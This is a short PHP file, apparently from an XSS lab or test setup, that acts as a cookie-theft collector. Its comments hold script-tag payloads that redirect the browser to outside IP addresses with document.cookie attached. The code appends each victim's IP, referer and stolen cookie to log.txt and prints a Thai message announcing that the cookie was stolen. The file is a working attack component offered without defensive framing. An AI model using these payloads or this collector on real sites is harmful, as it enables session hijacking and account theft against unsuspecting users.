<?php 
//setcookie("name", $name=hahaha, time()+36000);
?>

<?php //('http://localhost/temp/xss/test/cookiestolen/payload.php?c='+document.cookie)---<script>document.location.replace('http://161.246.5.17/pro/payload?c='+document.cookie);</script>-----http://www.thaiadmin.org/board/index.php?topic=15670.msg82321#msg82321 //<script>window.onload="document.location.replace('http://161.246.5.13/sandbox/xss/test/cookiestolen/payload.php?c='+document.cookie)"</script>
echo "cookie ถูกขโมยเรียบร้อยแล้ววววววว.....<br> สามารถดูคุกกี้ที่ถูกขโมยได้ที่ directory ที่ติดตั้งเว็บนี้คือ /xss/test/cookiestolen/log.txt ";
echo "<br><a href=../webboard.php>กลับ</a>";
$f = fopen("log.txt", "a");
fwrite($f,"IP: {$_SERVER['REMOTE_ADDR']} Ref: {$_SERVER ['HTTP_REFERER']} Cookie: {$HTTP_GET_VARS['c']} \n \r");
fclose($f);
?>
